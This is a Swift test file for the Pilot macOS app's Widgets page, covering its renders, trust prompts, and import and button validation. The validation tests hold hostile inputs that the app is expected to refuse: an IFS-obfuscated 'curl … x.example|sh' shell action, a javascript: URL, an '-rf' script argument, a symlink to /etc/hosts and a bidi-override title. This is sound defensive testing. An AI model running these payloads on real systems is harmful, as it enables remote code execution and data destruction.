#if DEBUG
import AppKit
import Foundation
import PilotCore
import SwiftUI
import Testing
@testable import Pilot

extension SharedLook {
/// Look's Widgets page (spec pilot-1-1 T20): Pilot's ready widgets, a made-here and a locked widget with a broken folder
/// beside them, and two on the desktop, in each style, from a store of its own in a moved home; and its Trust this widget
/// question. Opt-in like the other renders:
/// `CFFIXED_USER_HOME=/tmp/pilot-render-home-w PILOT_RENDER_DIR=/tmp/pilot-renders-w swift test --filter WidgetsPageRenders`
@MainActor
@Suite("Widgets page renders")
struct WidgetsPageRenders {
    nonisolated static let env = ProcessInfo.processInfo.environment

    @Test("The Widgets page with each card's preview, solid and glass, and its Trust question, in each style",
          .enabled(if: env["PILOT_RENDER_DIR"] != nil && env["CFFIXED_USER_HOME"] != nil))
    func render() async throws {
        let dir = try WidgetRenders.dir()
        testApp()
        let store = try WidgetRenders.store()
        let mine = try WidgetRenders.make(store, "standup", """
            {"id": "standup", "title": "Stand-up timer", "icon": "⏱️", "description": "Minutes left in today's stand-up.",
             "data": {"command": ["./left.sh"], "every": 30}, "settings": [{"name": "minutes", "type": "number", "default": 15}]}
            """, files: ["left.sh": "#!/bin/sh\necho '{}'\n"])
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: mine.folder.appending(path: "left.sh").path)
        try store.setTrust(.madeHere, for: mine)
        let theirs = try WidgetRenders.make(store, "weather-page", """
            {"id": "weather-page", "title": "Weather page", "icon": "🌦️", "description": "From the gallery: a page and a feed.", "draw": "html",
             "data": {"command": ["./feed.sh", "--city", "Valletta"], "every": 600}, "hosts": ["api.open-meteo.com"]}
            """, files: ["index.html": "<p>weather</p>", "feed.sh": "#!/bin/sh\necho '{}'\n"])
        try FileManager.default.createDirectory(at: store.widgets.appending(path: "half-done"), withIntermediateDirectories: true)
        try store.save([Widget.Placement(widget: ReadyWidgets.clock, screen: nil, x: 0.05, y: 0.05, width: 260, height: 220),
                        Widget.Placement(widget: "standup", screen: nil, x: 0.6, y: 0.1, width: 240, height: 160),
                        Widget.Placement(widget: ReadyWidgets.launcher, screen: nil, x: 0, y: 0, width: 280, height: 130, home: true)])
        let model = WidgetsPageModel()
        model.store = store
        model.reload()
        #expect(model.installed.map(\.id) == ["standup", "weather-page"])
        #expect(model.trust["weather-page"] == .locked && model.trust["standup"] == .madeHere)
        #expect(model.broken.map(\.folder) == ["half-done"])
        let look = Look.shared
        let saved = (look.themeID, look.style, look.glass)
        defer { (look.themeID, look.style, look.glass) = saved }
        look.themeID = "lagoon"
        // Each card's preview as the page's load fills it: the fixed readings and notes, the Launcher's tiles, and with
        // PILOT_RESOURCES=Packaging the desk pages' pictures through the app's own path (fitted to their content), on
        // fixed data, as one placed or drawn unplaced keeps it; Weather has none yet, so its card says it draws once
        // placed, in the same frame as the rest (Sven, build 7).
        let previews = WidgetPreviews()
        previews.prepare(ReadyWidgets.all + model.installed, store: store)
        for widget in ReadyWidgets.inCode {
            previews.models[widget.id]?.blocks = WidgetRenders.blocks(widget)
            if widget.data == .nowPlaying { previews.models[widget.id]?.nowPlaying = WidgetRenders.playing() }
            // Its default tiles, as the engine resolves them in the app.
            if widget.menuField != nil { previews.models[widget.id]?.tiles = Array(WidgetRenders.tiles.prefix(4)); previews.models[widget.id]?.message = nil }
            if widget.actionsField != nil { previews.models[widget.id]?.picked = WidgetRenders.picked }
        }
        if !ReadyWidgets.desk.isEmpty {
            let desk = try DeskWidgetRenders.store()
            for widget in ReadyWidgets.desk where widget.id != "desk-weather" {
                var data = try DeskWidgetRenders.fixture(widget.id)
                if case .object(var fields) = data { fields["theme"] = DeskWidgetRenders.theme(look.theme); data = .object(fields) }
                previews.shots[widget.id] = try #require(await WidgetPreviews.shot(try #require(desk.widget(widget.id)), store: desk, data: data))
            }
        }
        #expect(ReadyWidgets.all.allSatisfy { previews.models[$0.id] != nil } && model.installed.allSatisfy { previews.models[$0.id] != nil })
        #expect(previews.models["weather-page"]?.locked != nil, "a locked widget previews as its Trust card")
        for style in PilotStyle.allCases {
            look.style = style
            for glass in [false, true] {
                look.glass = glass
                let page = MonitorsGround { WidgetsPage(model: model, reads: false, previews: previews) }
                    .styled(.page(.widgets)).frame(width: 1000, height: 3300).pilotTheme(look: look)
                try RestyledRenders.writeTrimmed(rendered(page), from: 0,
                                                 to: dir.appending(path: "widgets-page-\(style.rawValue)-\(glass ? "glass" : "solid").png"))
            }
            let question = WidgetTrustSheet(widget: theirs, inherits: "Saved under weather-page from before, which it can read once trusted: 2 settings, 1 password",
                                            trust: {}, cancel: {}).styled(.page(.widgets)).pilotTheme(look: look)
                .background(Theme.background)
            let shot = try rendered(question)
            try #require(shot.representation(using: .png, properties: [:])).write(to: dir.appending(path: "trust-question-\(style.rawValue).png"))
        }
    }

    /// The builder (T24): its sheet in each style, and the folders it writes for a reading and for a program, put in the
    /// render folder as `builder-reading/` and `builder-df/` for `pilot widget check`.
    @Test("The widget builder's sheet and the folders it writes", .enabled(if: env["PILOT_RENDER_DIR"] != nil && env["CFFIXED_USER_HOME"] != nil))
    func builder() throws {
        let dir = try WidgetRenders.dir()
        testApp()
        let store = try WidgetRenders.store()
        var reading = WidgetSpec()
        reading.title = "Battery and disk"; reading.readings = [.battery, .disk]
        var df = WidgetSpec()
        df.title = "Disk use"; df.source = .program; df.program = "/bin/df"; df.arguments = "-h\n/"; df.look = .list; df.colour = .amber
        for (name, spec) in [("builder-reading", reading), ("builder-df", df)] {
            let folder = dir.appending(path: name, directoryHint: .isDirectory)
            try? FileManager.default.removeItem(at: folder)
            try WidgetTemplates.write(try spec.files(id: name).get(), to: folder)
            _ = try Widget(folder: folder)
        }
        let look = Look.shared
        let saved = (look.themeID, look.style)
        defer { (look.themeID, look.style) = saved }
        look.themeID = "lagoon"
        for style in PilotStyle.allCases {
            look.style = style
            let sheet = WidgetBuilderSheet(spec: df, store: store, saved: { _ in }, cancel: {}).styled(.page(.widgets)).pilotTheme(look: look)
                .background(Theme.background)
            let shot = try rendered(sheet)
            try #require(shot.representation(using: .png, properties: [:])).write(to: dir.appending(path: "builder-\(style.rawValue).png"))
        }
    }

    /// What the page's Duplicate, Uninstall and Import do to the store, in a store of its own with a Trash folder of its
    /// own; written to `widgets/page-actions.txt`.
    @Test("Duplicate keeps a locked widget locked, Uninstall keeps settings, Import refuses links and locks", .enabled(if: env["PILOT_RENDER_DIR"] != nil && env["CFFIXED_USER_HOME"] != nil))
    func actions() async throws {
        let dir = try WidgetRenders.dir()
        let store = try WidgetRenders.store()
        let bin = store.widgets.deletingLastPathComponent().appending(path: "Trash")
        try FileManager.default.createDirectory(at: bin, withIntermediateDirectories: true)
        let trash: @Sendable (URL) throws -> Void = { try FileManager.default.moveItem(at: $0, to: bin.appending(path: "\($0.lastPathComponent)-\(UUID().uuidString)")) }
        var lines: [String] = []

        let clock = try #require(ReadyWidgets.widget(ReadyWidgets.clock))
        let copy = try await store.duplicate(clock)
        lines.append("duplicate of \(clock.id): \(copy.id), \(store.trust(of: copy).rawValue), reading \(copy.data.label)")
        #expect(copy.id == "clock-copy" && store.trust(of: copy) == .madeHere)

        let locked = try WidgetRenders.make(store, "feed", #"{"id": "feed", "title": "Feed", "data": {"command": ["./feed.sh"]}}"#,
                                            files: ["feed.sh": "#!/bin/sh\necho '{}'\n"])
        let lockedCopy = try await store.duplicate(locked)
        lines.append("duplicate of locked \(locked.id): \(lockedCopy.id), \(store.trust(of: lockedCopy).rawValue)")
        #expect(lockedCopy.id == "feed-copy" && store.trust(of: lockedCopy) == .locked)

        try store.setTrust(.madeHere, for: copy)
        try Data(#"{"city": "Kept"}"#.utf8).write(to: store.settingsFile(copy.id))
        try store.save([Widget.Placement(widget: copy.id, screen: nil, x: 0.1, y: 0.1, width: 200, height: 120)])
        try store.uninstall(copy, trash: trash)
        lines.append("uninstall \(copy.id): folder gone \(!FileManager.default.fileExists(atPath: copy.folder.path)), placements \(store.placements().count), settings kept \(FileManager.default.fileExists(atPath: store.settingsFile(copy.id).path))")
        #expect(!FileManager.default.fileExists(atPath: copy.folder.path) && store.placements().isEmpty)
        #expect(FileManager.default.fileExists(atPath: store.settingsFile(copy.id).path))
        // A stranger's folder claiming that id is told what it would be handed, before Import or Trust.
        let claimant = store.widgets.deletingLastPathComponent().appending(path: "claimant/\(copy.id)", directoryHint: .isDirectory)
        try FileManager.default.createDirectory(at: claimant, withIntermediateDirectories: true)
        try Data(#"{"id": "\#(copy.id)", "title": "Claimant"}"#.utf8).write(to: claimant.appending(path: Widget.manifestName))
        // Every password stored under the id counts, though the claimant declares no password field (a stand-in count:
        // nothing touches the Keychain).
        var counting = store
        counting.savedPasswords = { $0 == copy.id ? 1 : 0 }
        let inherited = counting.inherits(try Widget(folder: claimant))
        lines.append("a folder claiming \(copy.id) after its uninstall: \(inherited ?? "nothing")")
        #expect(inherited == "Saved under \(copy.id) from before, which it can read once trusted: 1 setting, 1 password")
        // A Keychain that does not answer reads as unknown, never as nothing.
        var silent = store
        silent.savedPasswords = { _ in nil }
        let unknown = silent.inherits(try Widget(folder: claimant))
        lines.append("the same, the Keychain not answering: \(unknown ?? "nothing")")
        #expect(unknown?.hasSuffix("1 setting, passwords unknown") == true)

        let outside = store.widgets.deletingLastPathComponent().appending(path: "incoming", directoryHint: .isDirectory)
        let linked = outside.appending(path: "linked", directoryHint: .isDirectory)
        try FileManager.default.createDirectory(at: linked, withIntermediateDirectories: true)
        try Data(#"{"id": "linked", "title": "Linked"}"#.utf8).write(to: linked.appending(path: Widget.manifestName))
        try FileManager.default.createSymbolicLink(atPath: linked.appending(path: "hosts").path, withDestinationPath: "/etc/hosts")
        do { _ = try await store.importFolder(linked, trash: trash); Issue.record("a folder with a link was imported") } catch {
            lines.append("import with a link: refused: \(error.description)")
        }
        let good = outside.appending(path: "good", directoryHint: .isDirectory)
        try FileManager.default.createDirectory(at: good, withIntermediateDirectories: true)
        try Data(#"{"id": "good", "title": "Good", "data": {"command": ["./run.sh"]}}"#.utf8).write(to: good.appending(path: Widget.manifestName))
        try Data("#!/bin/sh\necho '{}'\n".utf8).write(to: good.appending(path: "run.sh"))
        let imported = try await store.importFolder(good, trash: trash)
        lines.append("import good: \(imported.id), \(store.trust(of: imported).rawValue)")
        #expect(store.trust(of: imported) == .locked)
        try store.setTrust(.trusted, for: imported)
        let again = try await store.importFolder(good, trash: trash)
        lines.append("trusted, then imported again: \(store.trust(of: again).rawValue)")
        #expect(store.trust(of: again) == .locked)
        // What a question shows is what runs: a title with a bidi override does not read, and an argv word holding a
        // newline or a space shows escaped, in quotes.
        let bidi = #"{"id": "bidi", "title": "Clock ‮kcol", "data": {"command": ["./x"]}}"#
        do { _ = try Widget(manifest: Data(bidi.utf8), folder: store.widgets.appending(path: "bidi")); Issue.record("a bidi title read") } catch {
            lines.append("bidi title: refused: \(error.description)")
        }
        // An argv word that is not printable ASCII with single inner spaces, or a 13th word, does not read: every word
        // shows whole as typed, and none can draw a row mark.
        let refusedArgv = [("newline", #"["/bin/echo", "safe\nSites it lists: none"]"#), ("tab", #"["/bin/echo", "a\tb"]"#),
                           ("non-ASCII", #"["/bin/echo", "S\u00e3o Paulo"]"#), ("a row mark", #"["/bin/echo", "\u21164 --dry-run"]"#),
                           ("a blank symbol", #"["/bin/echo", "\u2800\u2800"]"#), ("two spaces", #"["/bin/echo", "a  b"]"#),
                           ("an end space", #"["/bin/echo", " a"]"#), ("thirteen", "[" + Array(repeating: #""w""#, count: 13).joined(separator: ", ") + "]")]
        for (name, argv) in refusedArgv {
            let manifest = #"{"id": "x", "title": "X", "data": {"command": "# + argv + "}}"
            do { _ = try Widget(manifest: Data(manifest.utf8), folder: store.widgets.appending(path: "x")); Issue.record("\(name) read") } catch {
                lines.append("argv with \(name): refused (\(error.reasons.joined(separator: "; ")))")
            }
        }
        let sly = try WidgetRenders.make(store, "sly", #"{"id": "sly", "title": "Sly", "data": {"command": ["/bin/echo", "say \"hi\"", "two words", "Sites it lists: none"]}}"#)
        try store.setTrust(.madeHere, for: sly)
        // The Allow prompt's own text, escaped once by AllowPrompt.thing: Pilot's lines first, the words last, counted,
        // each a row marked №.
        let tools = WidgetTools()
        tools.store = store
        let prompt = AllowPromptView.thing(try #require(tools.placeAsk("sly")))
        lines.append("Allow prompt for sly:\n\(prompt)")
        let sites = try #require(prompt.range(of: "Sites it lists: none")), runs = try #require(prompt.range(of: "Runs, as you"))
        #expect(sites.lowerBound < runs.lowerBound
                && prompt.contains("these 4 words, each a row from №:\n    №1  /bin/echo\n    №2  say \"hi\"\n    №3  two words\n    №4  Sites it lists: none"))
        // Every field at its largest still fits the prompt whole, as the prompt shows it: a 64-character id, a 60-character
        // title, a page, every 86400 s, a program outside the folder, 12 words of 320 characters, sites of 100.
        let id = String(repeating: "a", count: 64), title = String(repeating: "T", count: 60)
        let words = ["/bin/echo"] + (0..<10).map { String(repeating: "b", count: 26) + "\($0)" } + [String(repeating: "c", count: 41)]
        #expect(words.joined().count == Widget.longestCommand && words.count == Widget.mostWords)
        let host = String(repeating: "h", count: 45) + ".com"
        let widest = try WidgetRenders.make(store, id, """
            {"id": "\(id)", "title": "\(title)", "draw": "html", "hosts": ["\(host)", "\(host)"],
             "data": {"command": [\(words.map { "\"\($0)\"" }.joined(separator: ", "))], "every": 86400}}
            """, files: [Widget.entryName: "<p>wide</p>"])
        try store.setTrust(.madeHere, for: widest)
        // Install and Import name the source too: a path the length of a .zip in the temporary folder, replacing one, and
        // the line naming what it inherits under its id at its longest (30 settings, 30 passwords).
        let inherits = "Saved under \(id) from before, which it can read once trusted: 30 settings, passwords unknown"
        let source = URL(fileURLWithPath: NSTemporaryDirectory()).appending(path: "pilot-widget/a1b2c3d4/a-widget-from-a-friend.zip")
        let asks = [tools.placeAsk(id), WidgetTools.runAsk(widest, outside: nil),
                    WidgetTools.runAsk(widest, outside: URL(fileURLWithPath: NSHomeDirectory()).appending(path: "Downloads/a-widget-from-a-friend")),
                    WidgetTools.installAsk(widest, from: source, locked: false, replaces: true, inherits: inherits),
                    WidgetTools.installAsk(widest, from: source, locked: true, replaces: true, inherits: inherits)]
        #expect(asks.allSatisfy { $0 != nil })
        // Each ask also shows the one row form: the counted header, then every word a №n row, never a "1." row.
        let rows = "these 12 words, each a row from №:\n" + words.enumerated().map { "    №\($0.offset + 1)  \($0.element)" }.joined(separator: "\n")
        for ask in asks.compactMap({ $0 }) {
            let shown = AllowPromptView.thing(ask)
            let breaks = shown.count { $0 == "\n" }, length = shown.unicodeScalars.count
            lines.append("\(ask.title) for the widest widget: \(breaks) line breaks, \(length) characters as shown")
            #expect(breaks <= ControlGate.Ask.mostLines && length <= ControlGate.Ask.longest)
            #expect(shown.contains(rows) && !shown.contains("    1. "), "\(ask.title) rows")
        }
        // With buttons too (Q697): six at their longest titles, the command cut to what is left of the room the command,
        // sites and buttons share, its 12 words, so the most characters and the most lines a question can have both fit.
        let buttons = (0..<Widget.mostButtons).map { Widget.Button(title: String(repeating: "B", count: 23) + "\($0)", action: "apps.clean") }
        let left = Widget.longestCommand + Widget.longestHosts - 2 * host.count - 2 - Widget.buttonsLine(buttons).count
        let short = ["/bin/echo"] + (0..<10).map { "w\($0)" } + [String(repeating: "z", count: left - 9 - 20)]
        let buttonID = String(repeating: "u", count: 64)
        let withButtons = try WidgetRenders.make(store, buttonID, """
            {"id": "\(buttonID)", "title": "\(title)", "hosts": ["\(host)", "\(host)"],
             "data": {"command": [\(short.map { "\"\($0)\"" }.joined(separator: ", "))], "every": 86400},
             "buttons": [\(buttons.map { #"{"title": "\#($0.title)", "action": "\#($0.action)"}"# }.joined(separator: ", "))]}
            """)
        try store.setTrust(.madeHere, for: withButtons)
        let buttonInherits = "Saved under \(buttonID) from before, which it can read once trusted: 30 settings, passwords unknown"
        for ask in [tools.placeAsk(buttonID), WidgetTools.runAsk(withButtons, outside: nil),
                    WidgetTools.installAsk(withButtons, from: source, locked: false, replaces: true, inherits: buttonInherits),
                    WidgetTools.installAsk(withButtons, from: source, locked: true, replaces: true, inherits: buttonInherits)].compactMap({ $0 }) {
            let shown = AllowPromptView.thing(ask)
            let breaks = shown.count { $0 == "\n" }, length = shown.unicodeScalars.count
            lines.append("\(ask.title) for the widest widget with buttons: \(breaks) line breaks, \(length) characters as shown")
            #expect(breaks <= ControlGate.Ask.mostLines && length <= ControlGate.Ask.longest)
        }
        lines.append("its buttons line: \(Widget.buttonsLine(withButtons.buttons))")
        // One character more than the shared room is refused.
        do {
            _ = try Widget(manifest: Data("""
                {"id": "x", "title": "X", "hosts": ["\(host)", "\(host)"], "data": {"command": [\((short.dropLast() + [short.last! + "z"]).map { "\"\($0)\"" }.joined(separator: ", "))]},
                 "buttons": [\(buttons.map { #"{"title": "\#($0.title)", "action": "\#($0.action)"}"# }.joined(separator: ", "))]}
                """.utf8), folder: store.widgets.appending(path: "x"))
            Issue.record("a command, sites and buttons past the room read")
        } catch { lines.append("a command, sites and buttons one character past the room: refused (\(error.reasons.joined(separator: "; ")))") }
        // An actions setting instead of buttons (the Launcher's): its line counts in the same room, so the widest such
        // widget's questions fit too, and one character more is refused.
        let picksLeft = Widget.longestCommand + Widget.longestHosts - 2 * host.count - 2 - Widget.picksLine(["apps.clean"]).count
        let picksCommand = ["/bin/echo"] + (0..<10).map { "w\($0)" } + [String(repeating: "z", count: picksLeft - 9 - 20)]
        func picksManifest(_ id: String, _ command: [String]) -> String {
            """
            {"id": "\(id)", "title": "\(title)", "hosts": ["\(host)", "\(host)"],
             "data": {"command": [\(command.map { "\"\($0)\"" }.joined(separator: ", "))], "every": 86400},
             "settings": [{"name": "actions", "type": "actions", "default": ["apps.clean"]}]}
            """
        }
        let picksID = String(repeating: "q", count: 64)
        let withPicks = try WidgetRenders.make(store, picksID, picksManifest(picksID, picksCommand))
        try store.setTrust(.madeHere, for: withPicks)
        for ask in [tools.placeAsk(picksID), WidgetTools.runAsk(withPicks, outside: nil),
                    WidgetTools.installAsk(withPicks, from: source, locked: true, replaces: true, inherits: buttonInherits)].compactMap({ $0 }) {
            let shown = AllowPromptView.thing(ask)
            let breaks = shown.count { $0 == "\n" }, length = shown.unicodeScalars.count
            lines.append("\(ask.title) for the widest widget with an actions setting: \(breaks) line breaks, \(length) characters as shown")
            #expect(breaks <= ControlGate.Ask.mostLines && length <= ControlGate.Ask.longest)
        }
        do {
            _ = try Widget(manifest: Data(picksManifest("x", picksCommand.dropLast() + [picksCommand.last! + "z"]).utf8), folder: store.widgets.appending(path: "x"))
            Issue.record("a command, sites and an actions setting past the room read")
        } catch { lines.append("a command, sites and an actions setting one character past the room: refused (\(error.reasons.joined(separator: "; ")))") }
        // A button runs one fixed thing on one click, with no question (review, round 3): never a drive. id, a script, an id
        // carrying input, or one `pilot run` asks about; a plain Pilot action or extension command reads.
        func button(_ action: String) throws -> Widget {
            let json = try JSONEncoder().encode(JSONValue.object(["id": .string("x"), "title": .string("X"),
                                                                  "buttons": .array([.object(["title": .string("Go"), "action": .string(action)])])]))
            return try Widget(manifest: json, folder: store.widgets.appending(path: "x"))
        }
        for action in ["drive.menu:com.apple.finder:Finder > Empty Trash", "apps.clean,apps.update", #"drive.shell:curl${IFS}-s${IFS}x.example|sh"#,
                       "drive.menu:com.apple.mail:Edit>Delete", "drive.key:cmd+q", "drive.url:javascript:alert(1)", "scripts.run:/tmp/x.sh",
                       #"scripts.run:/tmp/x.sh/["-rf"]"#, #"ext.todo.add/"text""#, "system.shutDown", "system.restart", "system.logOut",
                       "apps.pastePlain", "system.lockKeyboard", "links.open:x",
                       // Round 3's second review: an allow-shape, not a list: no payload, nothing that acts on the Mac unasked.
                       "windows.closeAll", "windows.close", "system.wifi", "system.sleep", "system.lock", "system.ejectAll",
                       "system.clearAllNotifications", "engine.hyper", "engine.tilingOff", "look.ghosttyApply", "look.ghosttyRemove",
                       "dictation.toggle", "ai.fix", "apps.bitwardenLock", "apps.bitwardenFill", "captures.screenRecording", "engine.tilingOn",
                       "apps.open:com.apple.Terminal",
                       "apps.web:https://x.example", "apps.url:com.apple.Safari:https://x.example", "apps.private:com.apple.Safari",
                       "system.output:x", "system.pane:x", "window.page:install", "configs.edit:x", "rings.open:x", "workspaces.go:1",
                       "workspaces.move:1", "workspaces.moveFollow:1", "ext.todo", "ext.todo.add.more", "apps..clean"] {
            do { _ = try button(action); Issue.record("a button running \(action) read") } catch {
                lines.append("a button running \(action): refused (\((error as? Widget.Problems)?.reasons.joined(separator: "; ") ?? "\(error)"))")
            }
        }
        for action in ["apps.clean", "apps.update", "apps.notes", "apps.install", "apps.reports", "ext.todo.add"] {
            do { _ = try button(action); lines.append("a button running \(action): reads") } catch { Issue.record("\(action) refused: \(error)") }
        }
        // A program that is not there makes the longest header; that Place question fits too.
        let missingID = String(repeating: "m", count: 64)
        _ = try WidgetRenders.make(store, missingID, """
            {"id": "\(missingID)", "title": "\(title)", "draw": "html", "hosts": ["\(host)", "\(host)"],
             "data": {"command": ["./nope", \(words.dropFirst().map { "\"\($0)\"" }.joined(separator: ", "))], "every": 86400}}
            """, files: [Widget.entryName: "<p>wide</p>"])
        try store.setTrust(.madeHere, for: try #require(store.widget(missingID)))
        let missing = AllowPromptView.thing(try #require(tools.placeAsk(missingID)))
        lines.append("Place widget with a missing program: \(missing.count { $0 == "\n" }) line breaks, \(missing.unicodeScalars.count) characters as shown")
        #expect(missing.unicodeScalars.count <= ControlGate.Ask.longest)
        // Titles count in scalars, so accents cannot stretch one past the prompt; sites are ASCII host syntax.
        for (name, manifest) in [("an accented title", #"{"id": "x", "title": ""# + String(repeating: "a\u{301}", count: 60) + #""}"#),
                                 ("a non-ASCII host", #"{"id": "x", "title": "X", "hosts": ["bücher.example"]}"#),
                                 ("a host with a path", #"{"id": "x", "title": "X", "hosts": ["https://a/\\\\\\\\"]}"#),
                                 ("a № in the title", #"{"id": "x", "title": "№1 rm"}"#)] {
            do { _ = try Widget(manifest: Data(manifest.utf8), folder: store.widgets.appending(path: "x")); Issue.record("\(name) read") } catch {
                lines.append("\(name): refused (\(error.reasons.joined(separator: "; ")))")
            }
        }
        let card = WidgetAsks.lines(sly).map(WidgetAsks.shown)
        lines.append("card lines for sly: \(card)")
        let named = try WidgetRenders.make(store, "pilot", #"{"id": "pilot", "title": "Pilot copy test"}"#)
        let copied = try await store.duplicate(named)
        lines.append("duplicate of pilot: \(copied.id), reads: \(store.widget(copied.id) != nil)")
        #expect(!Widget.isReserved(copied.id) && store.widget(copied.id) != nil)
        try lines.joined(separator: "\n").appending("\n").write(to: dir.appending(path: "page-actions.txt"), atomically: true, encoding: .utf8)
    }
}
}
#endif
